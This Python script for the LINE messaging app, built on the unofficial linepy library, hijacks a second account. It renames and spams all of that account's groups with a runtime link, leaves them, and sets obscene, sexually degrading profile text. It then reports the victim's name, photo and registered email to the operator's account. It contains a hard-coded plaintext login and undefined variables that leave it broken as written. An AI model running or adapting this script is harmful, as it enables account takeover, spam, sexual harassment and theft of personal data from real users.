from linepy import *
client = LINE('koutamanto@icloud.com','kouta1014')
destroy2 = LINE()
client.log("[destroy2 Auth Token :]"+str(client.authToken))
dmids = destroy2.getAllContactIds()
dgids = destroy2.getGroupIdsJoined()
dset = destroy2.getSettings()
link = input("URL?:")
for dgid in dgids:
	X = destroy2.getGroup(dgid)
	X.name = "koutaが乗っ取ってみたwww"
	destroy2.updateGroup(X)
	destroy2.sendMessage(dgid,"半botの無料URLはこちら！" + link)
	destroy2.leaveGroup(dgid)
	dgcount = dgcount + 1
dp = destroy2.getProfile()
dp.displayName = "koutaの専属肉便器www"
dp.statusMessage = "あぁイクイク　おっぱいまんこまんこちんこ！"
destroy2.updateProfile(dp)
dmail = dset.identityIdentifier
dmid = dp.mid
dc = destroy2.getContact(dmid)
client.sendMessage(to,"-乗っ取り成功通知-")
client.sendMessage(to,"[ユーザー名:]" + dp.displayName)
client.sendImageWithURL(msg.to,"http://dl.profile.line-cdn.net/" + dc.pictureStatus)
client.sendMessage(to,"[乗っ取りグループ数:]" + dgcount)
client.sendMessage(to,"[登録メールアドレス:]" + dmail)
client.sendContact(to,dp.mid)
print("-乗っ取り成功通知-")
print("[ユーザー名:]" + dp.displayName)
print("[乗っ取りグループ数:]" + dgcount)
print("[登録メールアドレス:]" + dmail)